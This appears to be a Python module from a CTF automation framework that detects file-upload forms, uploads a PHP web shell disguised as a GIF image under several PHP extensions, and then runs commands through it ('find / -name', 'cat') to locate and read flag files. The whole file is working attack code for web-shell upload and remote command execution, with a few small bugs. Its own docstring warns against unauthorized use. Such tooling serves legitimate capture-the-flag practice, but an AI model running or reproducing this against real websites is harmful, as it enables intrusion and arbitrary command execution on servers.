"""
Upload a basic PHP web shell to look for a flag file.

This unit will to see if there upload functionality on a webpage, and if it
finds one, it will attempt to upload a basic PHP web shell masked inside of
a GIF image. That syntax is simply:

.. code:: php

    GIF89a;
    <?php system($_GET['c']) ?>


If the unit can find the new file that it uploaded, it will attempt to run 
commands and look for a ``flag.txt`` or ``flag`` file on the remote server.

This unit inherits from :class:`katana.units.web.WebUnit` as that contains
lots of predefined variables that can be used throughout multiple web units.

.. warning::
    
    This unit automatically attempts to perform malicious actions on the 
    target. **DO NOT** use this in any circumstances where you do not have the
    authority to operate!

"""

from io import StringIO

import requests
from katana.unit import NotApplicable
from katana.units import web

import re

from typing import Any


class Unit(web.WebUnit):

    GROUPS = ["web", "shell", "basic_img_shell"]
    """
    These are "tags" for a unit. Considering it is a web unit, "web"
    is included, as well as the tag "shell", and the name of the unit itself,
    "basic_img_shell".
    """

    PRIORITY = 60
    """
    Priority works with 0 being the highest priority, and 100 being the 
    lowest priority. 50 is the default priorty. This unit has a somewhat
    lower priority.
    """

    RECURSE_SELF = False
    """
    This unit should not recurse on itself.
    """

    def __init__(self, *args, **kwargs):
        """
        The constructor is included to first determine if there is upload
        functionality on this web page. If a form with upload functionality
        is not found, it will abort.
        """

        # Run the parent constructor, to ensure this is a valid URL
        super(Unit, self).__init__(*args, **kwargs)

        self.action = [b"#"]
        self.upload = re.findall(
            rb'enctype=[\'"]multipart/form-data[\'"]',
            self.target.content,
            flags=re.IGNORECASE,
        )

        if not self.upload:
            # If there is no upload functionality, don't bother with this unit
            raise NotApplicable

    def enumerate(self):
        """
        Yield cases. This function will actually attempt to upload
        a PHP webshell with a variety of file extensions, like
        ``["php", "gif", "php3", "php5", "php7"]`` and yield the proper
        HTTP action, method, parameters and potentially a file location to 
        reach the uploaded webshell. Running commands takes place within the
        ``evaluate`` function.

        :return: A generator, yielding a tuple with the found values \
        ``(method, action, file, ext, location, file_path)``
        """

        action: list = re.findall(
            rb'<\s*form.*action\s*=\s*[\'"](.+?)[\'"]',
            self.target.content,
            flags=re.IGNORECASE,
        )
        method: list = re.findall(
            rb'<\s*form.*method\s*=\s*[\'"](.+?)[\'"]',
            self.target.content,
            flags=re.IGNORECASE,
        )
        upload = self.upload

        # Sometimes, a form might not have an explicit location.
        # Assume the current page!
        if not action:
            action = self.action

        file_regex = rb'<\s*input.*name\s*=\s*[\'"](%s)[\'"]' % b"|".join(
            web.potential_file_variables
        )
        file = re.findall(file_regex, self.target.content, flags=re.IGNORECASE)

        if not file:
            return  # This will tell THE WHOLE UNIT to stop!

        if action and method and upload and file:
            if action:
                action = action[0].decode("utf-8")
            if action.startswith(self.target.url_root):
                action = action[len(self.target.url_root) :].decode("utf-8")
            if method:
                method = method[0].decode("utf-8")
            if file:
                file = file[0].decode("utf-8")

            try:
                method = vars(requests)[method.lower()]
            except IndexError:
                # Could not find an appropriate HTTP method... defaulting to POST!"
                method = requests.post

            extensions = ["php", "gif", "php3", "php5", "php7"]

            for ext in extensions:
                r = method(
                    self.target.upstream.decode("utf-8").rstrip("/") + "/" + action,
                    files={
                        file: (
                            "anything.%s" % ext,
                            StringIO(
                                f'GIF89a;{web.delim}<?php system($_GET["c"]) ?>{web.delim}'
                            ),
                            "image/gif",
                        )
                    },
                )

                potential_location_regex = "href=[\"'](.+?.%s)[\"']" % ext

                location = re.findall(
                    potential_location_regex, r.text, flags=re.IGNORECASE
                )
                if location:
                    for file_path in location:
                        if file_path.startswith(self.target.url_root):
                            file_path = file_path[len(self.self.target.url_root) :]
                        yield (method, action, file, ext, location, file_path)

        else:
            return  # This will tell THE WHOLE UNIT to stop!

    def evaluate(self, case: Any):
        """
        Evaluate the target. Use the uploaded webshell to try and run commands
        and if command output is shown, find a potential flag location. If
        a flag file is found, it will attempt to display that flag. 

        :param case: A case returned by ``enumerate``. For this unit,\
        the ``enumerate`` function yields the information necessary to access \
        the newly uploaded webshell.

        :return: None. This function should not return any data.

        """

        # Split up the self.target (see get_cases)
        method, action, file, ext, location, file_path = case

        r = requests.get(
            self.target.url_root.rstrip("/") + "/" + file_path,
            params={"c": f"/bin/echo -n {web.special}"},
        )

        if f"{web.delim}{web.special}{web.delim}" in r.text:
            for flagname in potential_flag_names:
                r = requests.get(
                    self.target.url_root.rstrip("/") + "/" + file_path,
                    params={"c": f"find / -name {flagname}"},
                )

                flag_locations = re.findall(
                    f"{web.delim}(.+?){web.delim}",
                    r.text,
                    flags=re.MULTILINE | re.DOTALL,
                )

                if flag_locations:
                    flag_locations = flag_locations[0]

                    for fl in flag_locations.split("\n"):
                        fl = fl.strip()

                        r = requests.get(
                            self.target.url_root.rstrip("/") + "/" + file_path,
                            params={"c": f"cat {fl}"},
                        )

                        flag = re.findall(
                            f"{web.delim}(.+?){web.delim}",
                            r.text,
                            flags=re.MULTILINE | re.DOTALL,
                        )
                        if flag:
                            flag = flag[0]
                            self.manager.register_data(self, flag)

        # You should ONLY return what is "interesting"
        # Since we cannot gauge the results of this payload versus the others,
        # we will only care if we found the flag.
        return None
